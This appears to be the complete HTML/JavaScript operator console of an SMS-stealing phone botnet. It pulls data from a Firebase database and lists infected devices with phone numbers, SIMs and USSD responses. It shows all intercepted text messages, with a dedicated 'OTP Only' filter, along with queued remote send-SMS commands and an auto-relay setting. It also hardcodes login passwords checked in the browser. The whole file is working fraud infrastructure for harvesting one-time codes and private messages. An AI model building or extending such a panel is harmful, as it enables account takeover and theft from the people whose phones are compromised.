<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Admin Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#080c1a;--glass:rgba(255,255,255,0.03);--glass2:rgba(255,255,255,0.06);--border:rgba(255,255,255,0.06);--text:#e0e8f0;--dim:rgba(224,232,240,0.45);--accent:#00d4ff;--accent2:#7c4dff;--green:#00e676;--red:#ff1744;--orange:#ffab00;--r:16px}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;user-select:text;-webkit-user-select:text}
body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 20% 50%,rgba(0,212,255,0.04) 0%,transparent 50%),radial-gradient(ellipse at 80% 50%,rgba(124,77,255,0.04) 0%,transparent 50%);pointer-events:none;z-index:0}
.glass{background:var(--glass);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);border:1px solid var(--border);border-radius:var(--r)}
.glow{box-shadow:0 0 30px rgba(0,212,255,0.04),inset 0 1px 0 rgba(255,255,255,0.04)}
input,select,textarea{background:var(--glass);border:1px solid var(--border);border-radius:12px;padding:10px 16px;color:var(--text);font-family:inherit;font-size:14px;outline:none;transition:border .3s;width:100%}
input:focus,select:focus,textarea:focus{border-color:var(--accent)}
input::placeholder,textarea::placeholder{color:var(--dim)}
.btn{padding:8px 20px;border:1px solid var(--border);border-radius:10px;background:var(--glass);color:var(--text);cursor:pointer;font-size:13px;font-family:inherit;transition:all .3s;backdrop-filter:blur(10px);white-space:nowrap}
.btn:hover{background:var(--glass2);border-color:var(--accent)}
.btn-p{background:linear-gradient(135deg,var(--accent),var(--accent2));border:none;color:#080c1a;font-weight:600}
.btn-p:hover{opacity:.85;border:none}
.login{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:100}
.login-card{padding:36px;width:340px;max-width:90vw;text-align:center}
.login-card .logo{font-size:44px;color:var(--accent);margin-bottom:12px}
.login-card h2{margin-bottom:4px;font-weight:600}
.login-card .sub{color:var(--dim);font-size:13px;margin-bottom:24px}
.login-card input{margin-bottom:12px;text-align:center;font-size:16px;letter-spacing:3px}
.login-card .err{color:var(--red);font-size:12px;margin-top:8px;display:none}
.header{padding:14px 20px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between}
.header h1{font-size:18px;font-weight:600}
.header h1 i{color:var(--accent);margin-right:8px}
.header .info{display:flex;align-items:center;gap:10px;font-size:13px;color:var(--dim)}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:20px}
.stat{padding:16px;text-align:center;position:relative;overflow:hidden}
.stat::before{content:'';position:absolute;top:0;left:16px;right:16px;height:2px;border-radius:0 0 4px 4px}
.stat.t::before{background:var(--accent)}.stat.on::before{background:var(--green)}.stat.off::before{background:var(--red)}.stat.s::before{background:var(--orange)}.stat.b::before{background:var(--accent2)}
.stat .ico{font-size:22px;margin-bottom:6px}
.stat .n{font-size:28px;font-weight:700}
.stat .l{font-size:12px;color:var(--dim);margin-top:2px}
.tabs{display:flex;gap:3px;margin-bottom:16px;padding:3px;border-radius:12px;background:var(--glass);flex-wrap:wrap}
.tab{padding:8px 16px;border-radius:9px;cursor:pointer;font-size:12px;color:var(--dim);transition:all .3s;border:none;background:transparent;font-family:inherit;white-space:nowrap}
.tab:hover{color:var(--text);background:var(--glass2)}
.tab.act{color:#080c1a;background:linear-gradient(135deg,var(--accent),var(--accent2));font-weight:600}
.tab i{margin-right:5px}
.sec{display:none}.sec.act{display:block}
.sbar{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;align-items:center}
.sbar input{flex:1;min-width:180px}
.chips{display:flex;gap:4px;background:var(--glass);padding:3px;border-radius:10px}
.chip{padding:5px 14px;border-radius:8px;font-size:12px;cursor:pointer;color:var(--dim);transition:all .2s;border:none;background:transparent;font-family:inherit;font-weight:500}
.chip:hover{color:var(--text)}
.chip.act{background:linear-gradient(135deg,var(--accent),var(--accent2));color:#080c1a;font-weight:600}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px}
.card{padding:16px;transition:all .3s}
.card:hover{border-color:rgba(0,212,255,0.15)}
.card .top{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
.card .uid{font-size:12px;font-weight:600;font-family:monospace;color:var(--accent);cursor:pointer}
.card .badge{padding:2px 8px;border-radius:12px;font-size:10px;font-weight:600}
.badge.on{background:rgba(0,230,118,0.12);color:var(--green)}
.badge.off{background:rgba(255,23,68,0.12);color:var(--red)}
.card .g{display:grid;grid-template-columns:1fr 1fr;gap:4px;font-size:12px}
.card .g .lb{color:var(--dim)}
.card .ac{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
.card .ac .btn{font-size:11px;padding:4px 12px}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(8px);z-index:200;display:none;align-items:center;justify-content:center;padding:16px}
.modal.s{display:flex}
.modal .mw{padding:24px;width:680px;max-width:100%;max-height:90vh;overflow-y:auto;position:relative}
.modal .mw .x{position:absolute;top:12px;right:12px;width:28px;height:28px;border-radius:50%;border:none;background:var(--glass);color:var(--text);cursor:pointer;font-size:14px;display:flex;align-items:center;justify-content:center}
.modal .mw .x:hover{background:var(--glass2)}
.modal h3{margin-bottom:12px}
.modal h3 i{color:var(--accent);margin-right:8px}
.modal .item{padding:10px;margin-bottom:6px;border-radius:10px;background:var(--glass);font-size:12px;border-left:3px solid var(--accent)}
.modal .item .m{color:var(--dim);font-size:11px;margin-bottom:2px}
.modal .item .b{word-break:break-word}
.modal .item pre{font-family:monospace;white-space:pre-wrap;word-break:break-word;font-size:11px}
.toast{position:fixed;bottom:24px;right:24px;padding:12px 20px;border-radius:10px;background:var(--glass);backdrop-filter:blur(20px);border:1px solid var(--border);color:var(--text);font-size:13px;z-index:300;display:none;animation:up .3s ease}
@keyframes up{from{transform:translateY(16px);opacity:0}to{opacity:1}}
.load{text-align:center;padding:40px;color:var(--dim)}
.load .sp{width:32px;height:32px;border:2px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 12px}
@keyframes spin{to{transform:rotate(360deg)}}
@media(max-width:600px){.grid{grid-template-columns:1fr}.stats{grid-template-columns:repeat(2,1fr)}.header{flex-direction:column;gap:8px}}
</style>
</head>
<body>

<div class="login" id="loginScreen">
  <div class="login-card glass glow">
    <div class="logo"><i class="fas fa-crown"></i></div>
    <h2>Admin Panel</h2>
    <p class="sub">Enter password to continue</p>
    <input type="password" id="loginPass" placeholder="Password" autocomplete="off" onkeydown="if(event.key==='Enter')doLogin()">
    <button class="btn btn-p" style="width:100%;padding:12px" onclick="doLogin()">Unlock</button>
    <div class="err" id="loginErr">Invalid password</div>
  </div>
</div>

<div class="page" id="main" style="display:none;padding:16px;max-width:1400px;margin:0 auto;position:relative;z-index:1">
  <div class="header glass glow">
    <h1><i class="fas fa-crown"></i> Admin Panel</h1>
    <div class="info">
      <span id="devCount">0 devices</span>
      <button class="btn" onclick="logout()" title="Logout"><i class="fas fa-right-from-bracket"></i></button>
    </div>
  </div>

  <div class="stats" id="statsRow">
    <div class="stat glass glow t"><div class="ico" style="color:var(--accent)"><i class="fas fa-mobile"></i></div><div class="n" id="sTotal">-</div><div class="l">Total</div></div>
    <div class="stat glass glow on"><div class="ico" style="color:var(--green)"><i class="fas fa-wifi"></i></div><div class="n" id="sOnline">-</div><div class="l">Online</div></div>
    <div class="stat glass glow off"><div class="ico" style="color:var(--red)"><i class="fas fa-power-off"></i></div><div class="n" id="sOffline">-</div><div class="l">Offline</div></div>
    <div class="stat glass glow s"><div class="ico" style="color:var(--orange)"><i class="fas fa-envelope"></i></div><div class="n" id="sSms">-</div><div class="l">SMS</div></div>
    <div class="stat glass glow b"><div class="ico" style="color:var(--accent2)"><i class="fas fa-plug"></i></div><div class="n" id="sBattery">-</div><div class="l">Avg Battery</div></div>
  </div>

  <div class="tabs" id="tabs">
    <button class="tab act" data-t="devices"><i class="fas fa-mobile"></i> Devices</button>
    <button class="tab" data-t="allsms"><i class="fas fa-envelope"></i> All SMS</button>
    <button class="tab" data-t="clients"><i class="fas fa-users"></i> Clients</button>
    <button class="tab" data-t="commands"><i class="fas fa-terminal"></i> Commands</button>
    <button class="tab" data-t="settings"><i class="fas fa-cog"></i> Settings</button>
  </div>

  <div class="sec act" id="sec_devices">
    <div class="sbar">
      <input type="text" id="devSearch" placeholder="Search device, phone, model..." oninput="filterDevices()">
      <div class="chips" id="statusChips">
        <span class="chip act" data-v="" onclick="setFilter(this)">All</span>
        <span class="chip" data-v="online" onclick="setFilter(this)">Online</span>
        <span class="chip" data-v="offline" onclick="setFilter(this)">Offline</span>
      </div>
      <button class="btn btn-p" onclick="loadData()"><i class="fas fa-rotate"></i> Refresh</button>
    </div>
    <div class="grid" id="devGrid"><div class="load"><div class="sp"></div>Loading...</div></div>
  </div>

  <div class="sec" id="sec_allsms">
    <div class="sbar"><input type="text" id="allsmsSearch" placeholder="Search sender, body, device..." oninput="renderAllSms()"><select id="allsmsFilter" onchange="renderAllSms()"><option value="">All</option><option value="otp">OTP Only</option></select></div>
    <div id="allsmsContainer"><div class="load"><div class="sp"></div>Loading...</div></div>
  </div>

  <div class="sec" id="sec_clients"><div id="clientsContainer"><div class="load"><div class="sp"></div>Loading...</div></div></div>
  <div class="sec" id="sec_commands"><div id="commandsContainer"><div class="load"><div class="sp"></div>Loading...</div></div></div>
  <div class="sec" id="sec_settings"><div id="settingsContainer"><div class="load"><div class="sp"></div>Loading...</div></div></div>
</div>

<div class="modal" id="modal">
  <div class="mw glass glow">
    <button class="x" onclick="closeModal()"><i class="fas fa-xmark"></i></button>
    <div id="modalBody"></div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
const FB = "https://u72749819-fa563-default-rtdb.firebaseio.com";
let ALL_DATA = {}, DEVICES = {}, SMS = {}, CLIENTS = {}, COMMANDS = {}, SETTINGS = {};
let AUTHED = false;

function fbGet(path) { return fetch(FB + "/" + path + ".json").then(r => r.json()).catch(() => null); }
function toast(msg) {
  const t = document.getElementById("toast");
  t.textContent = msg; t.style.display = "block";
  clearTimeout(t._h); t._h = setTimeout(() => t.style.display = "none", 2500);
}
function logout() { AUTHED = false; document.getElementById("main").style.display = "none"; document.getElementById("loginScreen").style.display = "flex"; }
function parseTime(t) { if (!t) return 0; if (typeof t === "number") return t; const d = new Date(t); return d.getTime() || 0; }

function parseDeviceInfo(str) {
  const r = { model: "", os: "", name: "", id: "" };
  if (!str) return r;
  str.split("\n").forEach(l => {
    if (l.startsWith("Model:")) r.model = l.replace("Model:", "").trim();
    else if (l.startsWith("OS Version:")) r.os = l.replace("OS Version:", "").trim();
    else if (l.startsWith("Device Name:")) r.name = l.replace("Device Name:", "").trim();
    else if (l.startsWith("Device ID:")) r.id = l.replace("Device ID:", "").trim();
  });
  return r;
}

function switchTab(tabName) {
  document.querySelectorAll(".tab").forEach(t => t.classList.remove("act"));
  document.querySelectorAll(".sec").forEach(s => s.classList.remove("act"));
  document.querySelector(`.tab[data-t="${tabName}"]`).classList.add("act");
  document.getElementById("sec_" + tabName).classList.add("act");
  if (tabName === "allsms") renderAllSms();
  if (tabName === "clients") renderClients();
  if (tabName === "commands") renderCommands();
  if (tabName === "settings") renderSettings();
}

async function doLogin() {
  const p = document.getElementById("loginPass").value;
  if (!p) { document.getElementById("loginErr").style.display = "block"; return; }
  if (["Alexa","Ravan"].includes(p)) {
    AUTHED = true;
    document.getElementById("loginScreen").style.display = "none";
    document.getElementById("main").style.display = "block";
    loadData();
    toast("Access Granted"); return;
  }
  const settings = await fbGet("settings") || {};
  const allPas = await fbGet("all_pas") || {};
  const adminPass = (settings.admin_password || "").toString();
  const loginPass = (allPas.login && allPas.login.password || "").toString();
  if (p === adminPass || p === loginPass) {
    AUTHED = true;
    document.getElementById("loginScreen").style.display = "none";
    document.getElementById("main").style.display = "block";
    loadData();
    toast("Access Granted"); return;
  }
  document.getElementById("loginErr").textContent = "Access Denied";
  document.getElementById("loginErr").style.display = "block";
}

async function checkAutoLogin() {
  if (AUTHED) return;
}

async function loadData() {
  const [devices, sms, clients, commands, settings] = await Promise.all([
    fbGet("user_data"), fbGet("user_sms"), fbGet("clients"),
    fbGet("All_User/commands"), fbGet("settings")
  ]);
  DEVICES = devices || {}; SMS = sms || {}; CLIENTS = clients || {}; COMMANDS = commands || {}; SETTINGS = settings || {};

  const ids = Object.keys(DEVICES);
  let online = 0, offline = 0, smsCount = 0, batterySum = 0, batteryCount = 0;
  ids.forEach(id => {
    const d = DEVICES[id] || {};
    const s = (d.status || "").toLowerCase();
    if (s === "online") online++; else if (s === "offline") offline++;
    if (d.battery !== undefined) { batterySum += Number(d.battery); batteryCount++; }
    const devSms = SMS[id];
    if (typeof devSms === "object") smsCount += Object.keys(devSms).length;
  });

  document.getElementById("sTotal").textContent = ids.length;
  document.getElementById("sOnline").textContent = online;
  document.getElementById("sOffline").textContent = offline;
  document.getElementById("sSms").textContent = smsCount;
  document.getElementById("sBattery").textContent = batteryCount ? Math.round(batterySum / batteryCount) + "%" : "-";
  document.getElementById("devCount").textContent = ids.length + " devices";

  filterDevices();
  renderAllSms();
  renderClients();
  renderCommands();
  renderSettings();
}

function getDeviceSimInfo(uid) {
  let sims = new Set();
  const devSms = SMS[uid];
  if (typeof devSms === "object") {
    Object.values(devSms).forEach(s => {
      if (s.sim_number) sims.add(s.sim_number);
    });
  }
  return [...sims].join(", ") || (DEVICES[uid] && DEVICES[uid].sim_slot !== undefined ? "SIM " + (Number(DEVICES[uid].sim_slot)+1) : "-");
}

function renderDevices(list) {
  if (!list.length) { document.getElementById("devGrid").innerHTML = '<div style="text-align:center;padding:40px;color:var(--dim)">No devices</div>'; return; }
  let smsCounts = {};
  Object.keys(SMS).forEach(uid => { const m = SMS[uid]; if (typeof m === "object") smsCounts[uid] = Object.keys(m).length; });
  document.getElementById("devGrid").innerHTML = list.map(d => {
    const info = parseDeviceInfo(d.Device_info);
    const ol = (d.status || "").toLowerCase() === "online";
    const phone = d.phoneNumber || "-";
    const bat = d.battery !== undefined ? d.battery + "%" : "-";
    const sim = getDeviceSimInfo(d.device);
    const smsN = smsCounts[d.device] || 0;
    return `<div class="card glass glow" id="card-${d.device}">
      <div class="top">
        <span class="uid" onclick="showDetail('${d.device}')"><i class="fas fa-mobile"></i> ${(d.device || "").slice(0,12)}</span>
        <span class="badge ${ol ? 'on' : 'off'}">${ol ? 'Online' : 'Offline'}</span>
      </div>
      <div class="g">
        <span class="lb">Model</span><span>${info.model || d.d_name || "-"}</span>
        <span class="lb">Phone</span><span>${phone}</span>
        <span class="lb">SIM</span><span>${sim}</span>
        <span class="lb">Battery</span><span style="color:${bat > 20 ? 'var(--green)' : 'var(--red)'}">${bat}</span>
        <span class="lb">SMS</span><span style="color:var(--accent)">${smsN} msgs</span>
        <span class="lb">OS</span><span>${info.os || "-"}</span>
      </div>
      <div class="ac">
        <button class="btn" onclick="showDetail('${d.device}')"><i class="fas fa-info"></i> Info</button>
        <button class="btn" onclick="showSms('${d.device}')"><i class="fas fa-envelope"></i> SMS</button>
      </div>
    </div>`;
  }).join("");
}

function setFilter(el) {
  document.querySelectorAll("#statusChips .chip").forEach(c => c.classList.remove("act"));
  el.classList.add("act");
  filterDevices();
}
function filterDevices() {
  const q = document.getElementById("devSearch").value.toLowerCase();
  const sf = document.querySelector("#statusChips .chip.act").dataset.v;
  let list = Object.keys(DEVICES).map(id => ({ uid: id, ...DEVICES[id] }));
  if (sf === "online") list = list.filter(d => (d.status || "").toLowerCase() === "online");
  if (sf === "offline") list = list.filter(d => (d.status || "").toLowerCase() !== "online");
  if (q) list = list.filter(d => {
    const info = parseDeviceInfo(d.Device_info);
    const s = d.device + " " + (info.model||"") + " " + (info.name||"") + " " + (d.phoneNumber||"") + " " + (d.d_name||"");
    return s.toLowerCase().includes(q);
  });
  renderDevices(list);
}

function focusDevice(uid) {
  switchTab("devices");
  const el = document.getElementById("card-" + uid);
  if (el) el.scrollIntoView({ behavior: "smooth", block: "center" });
}

function showDetail(uid) {
  const d = DEVICES[uid] || {};
  const info = parseDeviceInfo(d.Device_info);
  const ol = (d.status || "").toLowerCase() === "online";
  const bat = d.battery !== undefined ? d.battery + "%" : "N/A";
  const msgs = SMS[uid] || {};
  const smsCount = typeof msgs === "object" ? Object.keys(msgs).length : 0;
  const sim = getDeviceSimInfo(uid);
  let html = `<div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;font-size:13px">
      <span style="color:var(--dim)">Device ID</span><span style="font-family:monospace">${uid}</span>
      <span style="color:var(--dim)">Model</span><span>${info.model || d.d_name || "N/A"}</span>
      <span style="color:var(--dim)">Device Name</span><span>${info.name || "N/A"}</span>
      <span style="color:var(--dim)">OS Version</span><span>${info.os || "N/A"}</span>
      <span style="color:var(--dim)">Phone</span><span>${d.phoneNumber || "N/A"}</span>
      <span style="color:var(--dim)">SIM</span><span>${sim}</span>
      <span style="color:var(--dim)">Battery</span><span style="color:${d.battery > 20 ? 'var(--green)' : 'var(--red)'}">${bat}</span>
      <span style="color:var(--dim)">Status</span><span style="color:${ol?'var(--green)':'var(--red)'}">${ol?"Online":"Offline"}</span>
      <span style="color:var(--dim)">SMS</span><span style="color:var(--accent)">${smsCount} messages</span>
      <span style="color:var(--dim)">User</span><span>${d.new_user || "N/A"}</span>
      <span style="color:var(--dim)">Last Seen</span><span>${d.timestamp ? new Date(d.timestamp).toLocaleString() : "N/A"}</span>
      <span style="color:var(--dim)">Time</span><span>${d.TimeandDate || "N/A"}</span>
    </div>`;
  if (d.ussd_code) html += `<div class="item" style="margin-top:10px"><div class="m">USSD Code</div><div class="b">${escHtml(d.ussd_code)}</div></div>`;
  if (d.ussd_response) html += `<div class="item"><div class="m">USSD Response</div><div class="b">${escHtml(d.ussd_response)}</div></div>`;
  document.getElementById("modalBody").innerHTML = `
    <h3><i class="fas fa-mobile"></i> Device Detail</h3>
    ${html}
    <div style="margin-top:12px;display:flex;gap:6px;flex-wrap:wrap">
      <button class="btn" onclick="closeModal();showSms('${uid}')"><i class="fas fa-envelope"></i> SMS (${smsCount})</button>
    </div>`;
  document.getElementById("modal").classList.add("s");
}

function showSms(uid) {
  const msgs = SMS[uid] || {};
  const keys = Object.keys(msgs).sort((a, b) => parseTime(msgs[b].timestamp) - parseTime(msgs[a].timestamp));
  let html = `<h3><i class="fas fa-envelope"></i> SMS - ${uid}</h3>`;
  if (!keys.length) html += '<div style="color:var(--dim);padding:20px;text-align:center">No SMS</div>';
  keys.slice(0, 100).forEach(k => {
    const s = msgs[k];
    const from = s.sender || "?";
    const body = s.body || "";
    const sim = s.sim_number || "";
    const ts = s.timestamp || s.date || "";
    html += `<div class="item">
      <div class="m"><i class="fas fa-user"></i> ${escHtml(from)} ${sim ? '| ' + sim : ''} ${ts ? '| ' + (typeof ts === 'number' ? new Date(ts).toLocaleString() : ts) : ''}</div>
      <div class="b">${escHtml(body)}</div>
    </div>`;
  });
  if (keys.length > 100) html += `<div style="text-align:center;padding:8px;color:var(--dim);font-size:11px">Showing 100 of ${keys.length}</div>`;
  html += `<div style="margin-top:10px"><button class="btn btn-p" onclick="closeModal()"><i class="fas fa-check"></i> Close</button></div>`;
  document.getElementById("modalBody").innerHTML = html;
  document.getElementById("modal").classList.add("s");
}

function renderAllSms() {
  const c = document.getElementById("allsmsContainer");
  const q = document.getElementById("allsmsSearch").value.toLowerCase();
  const f = document.getElementById("allsmsFilter").value;
  let all = [];
  Object.keys(SMS).forEach(uid => {
    const msgs = SMS[uid]; if (typeof msgs !== "object") return;
    Object.keys(msgs).forEach(k => { const s = msgs[k]; all.push({ ...s, _uid: uid, _key: k }); });
  });
  all.sort((a, b) => parseTime(b.timestamp) - parseTime(a.timestamp));
  if (f === "otp") all = all.filter(s => (s.body || "").toUpperCase().includes("OTP"));
  if (q) all = all.filter(s => ((s.sender || "") + " " + (s.body || "") + " " + s._uid).toLowerCase().includes(q));
  if (!all.length) { c.innerHTML = '<div style="text-align:center;padding:40px;color:var(--dim)">No SMS</div>'; return; }
  let html = `<div style="font-size:12px;color:var(--dim);margin-bottom:8px">${all.length} messages</div>`;
  all.slice(0, 200).forEach(s => {
    const from = s.sender || "?";
    const body = s.body || "";
    const ts = s.timestamp || s.date || "";
    const deviceName = (DEVICES[s._uid] && DEVICES[s._uid].d_name) || DEVICES[s._uid] && (parseDeviceInfo(DEVICES[s._uid].Device_info).model) || s._uid;
    html += `<div class="card glass glow" style="cursor:pointer;margin-bottom:6px" onclick="focusDevice('${s._uid}')">
      <div style="font-size:11px;color:var(--dim);margin-bottom:4px">
        <span style="color:var(--accent)">${escHtml(from)}</span>
        <span style="font-size:10px"> via ${escHtml(deviceName)}</span>
        ${s.sim_number ? '| ' + escHtml(s.sim_number) : ''}
        ${ts ? '<span style="float:right">' + (typeof ts === 'number' ? new Date(ts).toLocaleString() : ts) + '</span>' : ''}
      </div>
      <div style="font-size:13px;word-break:break-word">${escHtml(body)}</div>
    </div>`;
  });
  if (all.length > 200) html += `<div style="text-align:center;padding:10px;color:var(--dim);font-size:11px">Showing 200 of ${all.length}</div>`;
  c.innerHTML = html;
}

function renderClients() {
  const c = document.getElementById("clientsContainer");
  const ids = Object.keys(CLIENTS);
  if (!ids.length) { c.innerHTML = '<div style="text-align:center;padding:40px;color:var(--dim)">No clients</div>'; return; }
  c.innerHTML = '<div class="grid">' + ids.map(id => {
    const cl = CLIENTS[id] || {};
    const we = cl.webhookEvent || {};
    const sms = we.sendSms || {};
    return `<div class="card glass glow">
      <div style="font-size:11px;font-weight:600;color:var(--accent);font-family:monospace">${id.slice(0,8)}...</div>
      <div class="g" style="margin-top:6px">
        <span class="lb">To</span><span>${sms.to || "-"}</span>
        <span class="lb">Msg</span><span>${sms.message || "-"}</span>
        <span class="lb">From SIM</span><span>SIM ${sms.from || "?"}</span>
        <span class="lb">Sent</span><span style="color:${sms.isSended ? 'var(--green)' : 'var(--red)'}">${sms.isSended ? "Yes" : "No"}</span>
      </div>
    </div>`;
  }).join("") + '</div>';
}

function renderCommands() {
  const c = document.getElementById("commandsContainer");
  const ids = Object.keys(COMMANDS);
  if (!ids.length) { c.innerHTML = '<div style="text-align:center;padding:40px;color:var(--dim)">No commands</div>'; return; }
  c.innerHTML = '<div class="grid">' + ids.map(id => {
    const cmd = COMMANDS[id] || {};
    return `<div class="card glass glow">
      <div style="font-size:11px;font-weight:600;color:var(--accent);word-break:break-all">${id}</div>
      <div class="g" style="margin-top:6px">
        <span class="lb">Command</span><span>${cmd.cmd || "-"}</span>
        <span class="lb">Message</span><span>${cmd.msg || "-"}</span>
        <span class="lb">To</span><span>${cmd.to || "-"}</span>
        <span class="lb">SIM</span><span>SIM ${cmd.sim || "?"}</span>
        <span class="lb">Time</span><span>${cmd.timestamp ? new Date(cmd.timestamp).toLocaleString() : "-"}</span>
      </div>
    </div>`;
  }).join("") + '</div>';
}

function renderSettings() {
  const c = document.getElementById("settingsContainer");
  const s = SETTINGS;
  if (!s || !Object.keys(s).length) { c.innerHTML = '<div style="text-align:center;padding:40px;color:var(--dim)">No settings</div>'; return; }
  let html = '<div class="grid">';
  html += `<div class="card glass glow">
    <div style="font-weight:600;margin-bottom:8px;color:var(--accent)"><i class="fas fa-cog"></i> Admin Settings</div>
    <div class="g">
      <span class="lb">Password</span><span>${s.admin_password || "-"}</span>
    </div>
  </div>`;
  if (s.autoRelay) {
    html += `<div class="card glass glow">
      <div style="font-weight:600;margin-bottom:8px;color:var(--orange)"><i class="fas fa-random"></i> Auto Relay</div>
      <div class="g">
        <span class="lb">Active</span><span style="color:${s.autoRelay.active ? 'var(--green)' : 'var(--red)'}">${s.autoRelay.active ? "ON" : "OFF"}</span>
        <span class="lb">Device ID</span><span style="font-family:monospace">${s.autoRelay.deviceId || "-"}</span>
        <span class="lb">SIM Slot</span><span>SIM ${s.autoRelay.simSlot !== undefined ? Number(s.autoRelay.simSlot)+1 : "?"}</span>
      </div>
    </div>`;
  }
  html += `<div class="card glass glow">
    <div style="font-weight:600;margin-bottom:8px;color:var(--accent2)"><i class="fas fa-globe"></i> Session</div>
    <div class="g">
      <span class="lb">Global Session ID</span><span style="font-family:monospace;font-size:10px">${s.global_session_id || "-"}</span>
    </div>
  </div>`;
  html += '</div>';
  c.innerHTML = html;
}

function escHtml(s) {
  if (typeof s !== "string") s = String(s);
  const d = document.createElement("div"); d.textContent = s; return d.innerHTML;
}

function closeModal() { document.getElementById("modal").classList.remove("s"); }
document.getElementById("modal").addEventListener("click", function(e) { if (e.target === this) closeModal(); });

document.querySelectorAll(".tab").forEach(tab => {
  tab.addEventListener("click", function() {
    switchTab(this.dataset.t);
  });
});

checkAutoLogin();
setInterval(loadData, 30000);
</script>
</body>
</html>
